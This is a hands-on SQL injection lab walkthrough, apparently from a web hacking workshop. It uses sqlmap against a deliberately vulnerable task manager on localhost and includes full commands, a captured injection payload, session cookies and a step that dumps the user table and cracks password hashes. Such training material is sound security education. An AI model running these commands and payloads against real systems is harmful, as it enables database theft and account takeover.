# SQL Injection
### Description
Ability to influence the structure of a SQL database query through unsafe includes of user input.

* ` stmt = "SELECT * FROM users WHERE username=" + INPUT[user]`

### Tool
#### sqlmap
http://sqlmap.org - Command Line tool for dealing with SQL injection flaws

Required flags
- `-u URL` Target URL

Commonly-used configuration flags
- `--data=DATA` String to be sent through POST
- `--cookie=COOKIE` Cookie data for authenticated sessions
- `--proxy=PROXY` Route sqlmap requests through a proxy so you can see what it's doing
- `-p TESTPARAMETER` Parameter you want to check
- `-r REQUESTFILE` Load HTTP request from the following file

Quick check data access flags
- `-b, --banner` Retrieve DBMS banner
- `--current-user`
- `--current-db`

Dump the data flags
- `--dump-all` careful, this can be slow
- `--dump` dump the targeted table data
- `-D DB` target database
- `-T TBL` target table
- `-C COL` target column


## Walkthroughs

| Application | Location | Parameter | Tool |
| ---- | ---- | ---- | ---- |
| Vulnerable Task Manager | http://127.0.0.1:8000/taskManager/forgot_password/ | email | sqlmap |
| Vulnerable Task Manager | http://127.0.0.1:8000/taskManager/7/project_details/ | URL parameter | sqlmap |

### Forgot Password SQL Injection
#### Step 1 - Validate SQL Injection Vulnerability
Validate access to the vulnerable task manager application, you should see the following login page.

![vtm login](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-login.png)

Access the Forgot Password Page

![vtm forgot password](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-forgot-password.png)

Validate that the email parameter throws a SQL error message by inserting `test@tm.com'` into the Email form field

![vtm sql error](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-email-sql-error.png)


#### Step 2 - Use sqlmap to confirm vulnerability
Since the forgot password page does not require authentication, use some of the above flags to confirm the vulnerability by using flags for posting data to the endpoint
```
sqlmap.py -u http://127.0.0.1:8000/taskManager/forgot_password/ --data="email=test@tm.com" --banner
```

sqlmap will step through every parameter and ask if it should check for possible sql injection, you can bypass this check using `-p email`

```
sqlmap.py -u http://127.0.0.1:8000/taskManager/forgot_password/ --data="email=test@tm.com" -p email --banner
```

#### Step 3 - Explore commands sent using sqlmap with a proxy
Since you have confirmed that the endpoint is vulnerable to SQL Injection and exploitable with sqlmap, now use Burp Suite to view the requests being sent to the server by dumping the full schema of the backend mysql database.

```
sqlmap.py -u http://127.0.0.1:8000/taskManager/forgot_password/ --data="email=test@tm.com" -p email --proxy=http://127.0.0.1:8080 --schema
```

The full request to dump a portion of the schema looks as follows, use Burp Suite HTTP History to view similar requests.

```
POST /taskManager/forgot_password/ HTTP/1.1
Content-Length: 258
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.8.15#dev (http://sqlmap.org)
Host: 127.0.0.1:8000
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded; charset=utf-8

email=test%40tm.com%27%20AND%20EXTRACTVALUE%281890%2CCONCAT%280x5c%2C0x716a6a7071%2C%28SELECT%20MID%28%28IFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C21%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%202%2C1%29%2C0x71626a7071%29%29--%20UufD
```

### Project Details SQL Injection

#### Step 1 - Validate SQL Injection Vulnerability
Navigate back to the login page of vtm and login as `chris` with password `test123`

![vtm dashboard](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-chris-dashboard.png)

Browse to the *Marketing Campaign* project from the dashboard

![vtm project detail](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-project-details.png)

Check whether the URL project id, embedded between *taskManager* and *project_details* is vulnerable to sql injection by adding ` OR` (that's *space*OR) after the number 7.

![vtm sql error](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-project-sql-error.png)

#### Step 2 - Setup sqlmap to exploit the project details SQL Injection vulnerability

Since this page is only accessible to authenticated users, we will need to pull the cookie value associated with `chris` and add it to the sqlmap request.

Get all of the cookie headers using the browser's developer tools or viewing the request in Burp Suite. The request for the project details page will look similar to the following:

```
GET /taskManager/7/project_details/ HTTP/1.1
Host: 127.0.0.1:8000
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=i7yWZ7TaR5E2MlgtlpwZY3btCn7LTbnPNKCg0jUnnXk3vkJvUUn88A8pvNcu4H2p; sessionid=.eJxrYJk6nQECaqdo9PDGJ5aWZMSXFqcWxWemTOlhNJ7SI4QklpSYnJ2aB5TQTMlKzEvP10vOzyspykzSAynRg8oW6_nmp6TmOMHU8iMZkJFYnDGlR8Mi0TQtycg0Oc0g0cQsOcnCINkk2dQwLdXU1MTA1NzAyNLUIjU12dBsSqkeAFDNOHQ:1g0rQd:rLOHDuMX4-V_8MtaqmWRGiJhtrc
```

Since we currently don't know which of these values are required for user authorization, copy the entire string for use with sqlmap.

```
./sqlmap.py -u "http://127.0.0.1:8000/taskManager/7/project_details/" --cookie="csrftoken=CMk8epAzX7UDyXl2R0zBa2yfmZ8muICjJ7L2ZmUpKV962mlRNSthtANTaVkYubI0; sessionid=.eJxrYJk6nQECaqdo9PDGJ5aWZMSXFqcWxWemTOlhNJ7SI4QklpSYnJ2aB5TQTMlKzEvP10vOzyspykzSAynRg8oW6_nmp6TmOMHU8iMZkJFYnDGlR8Mi0TQtycg0Oc0g0cQsOcnCINkk2dQwLdXU1MTA1NzAyNLUIjU12dBsSqkeAFDNOHQ:1g0olo:wR61ZH3DwyceV4rXFs5WCkw-lXQ" --current-db
```

Running this command with the proper cookie value does not result in a successful sqlmap session, but will output something similar to the following:

```
[14:16:00] [WARNING] URI parameter '#1*' does not seem to be injectable
[14:16:00] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
[14:16:00] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 127 times
```

Since sqlmap does not recognize the project id parameter embedded in the URL, use the `*` character to denote where the injection should take place

```
./sqlmap.py -u "http://127.0.0.1:8000/taskManager/7*/project_details/" --cookie="csrftoken=i7yWZ7TaR5E2MlgtlpwZY3btCn7LTbnPNKCg0jUnnXk3vkJvUUn88A8pvNcu4H2p; sessionid=.eJxrYJk6nQECaqdo9PDGJ5aWZMSXFqcWxWemTOlhNJ7SI4QklpSYnJ2aB5TQTMlKzEvP10vOzyspykzSAynRg8oW6_nmp6TmOMHU8iMZkJFYnDGlR8Mi0TQtycg0Oc0g0cQsOcnCINkk2dQwLdXU1MTA1NzAyNLUIjU12dBsSqkeAFDNOHQ:1g0rQd:rLOHDuMX4-V_8MtaqmWRGiJhtrc" --current-db
```

#### Step 3 - Exploit the project detail SQLi to harvest user credentials

Not that we know this injection point is valid, let's attempt to enumerate the *auth_user* table within the *vtmdb* database by appending `--dump -D vtmdb -T auth_user` to the sqlmap command.

```
./sqlmap.py -u "http://127.0.0.1:8000/taskManager/7*/project_details/" --cookie="csrftoken=i7yWZ7TaR5E2MlgtlpwZY3btCn7LTbnPNKCg0jUnnXk3vkJvUUn88A8pvNcu4H2p; sessionid=.eJxrYJk6nQECaqdo9PDGJ5aWZMSXFqcWxWemTOlhNJ7SI4QklpSYnJ2aB5TQTMlKzEvP10vOzyspykzSAynRg8oW6_nmp6TmOMHU8iMZkJFYnDGlR8Mi0TQtycg0Oc0g0cQsOcnCINkk2dQwLdXU1MTA1NzAyNLUIjU12dBsSqkeAFDNOHQ:1g0rQd:rLOHDuMX4-V_8MtaqmWRGiJhtrc" --dump -D vtmdb -T auth_users
```

Allow sqlmap to run a brute-force attack against the identified md5 hashes and you should get information about most of the vtm accounts.

![vtm sql error](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-sqlmap-auth-user.png)

Congratulations! Test out `dade`'s password to verify that the credentials are active.

## Challenges


| Challenge | Difficulty |
| ---- | ---- |
| Altoro Mutual | http://demo.testfire.net |
| Bypass Login | :star: |
| That's a sketchy transaction | :star::star::star: |
| View all transactions	| :star::star::star:|
| Juice Shop | http://localhost:3000 |
| Bypass login | :star: |
